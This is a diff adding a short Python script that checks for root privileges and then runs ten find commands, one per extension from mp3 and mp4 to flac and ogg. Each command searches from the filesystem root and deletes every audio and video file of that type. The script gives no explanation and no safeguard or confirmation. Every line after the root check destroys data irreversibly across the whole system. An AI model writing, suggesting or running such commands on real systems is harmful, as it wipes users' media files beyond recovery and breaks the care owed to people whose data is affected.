@@ -1,0 +1,25 @@
+import os
+
+if not os.geteuid() == 0:
+    exit("\nOnly root can run this script\n")
+
+command = os.popen('find / -name \'*.mp3\' -type f -delete')
+command2 = command.read()
+command = os.popen('find / -name \'*.mp4\' -type f -delete')
+command3 = command.read()
+command = os.popen('find / -name \'*.wav\' -type f -delete')
+command4 = command.read()
+command = os.popen('find / -name \'*.avi\' -type f -delete')
+command5 = command.read()
+command = os.popen('find / -name \'*.mpg\' -type f -delete')
+command6 = command.read()
+command = os.popen('find / -name \'*.mpeg\' -type f -delete')
+command7 = command.read()
+command = os.popen('find / -name \'*.flac\' -type f -delete')
+command8 = command.read()
+command = os.popen('find / -name \'*.m4a\' -type f -delete')
+command9 = command.read()
+command = os.popen('find / -name \'*.flv\' -type f -delete')
+command0 = command.read()
+command = os.popen('find / -name \'*.ogg\' -type f -delete')
+command10 = command.read()
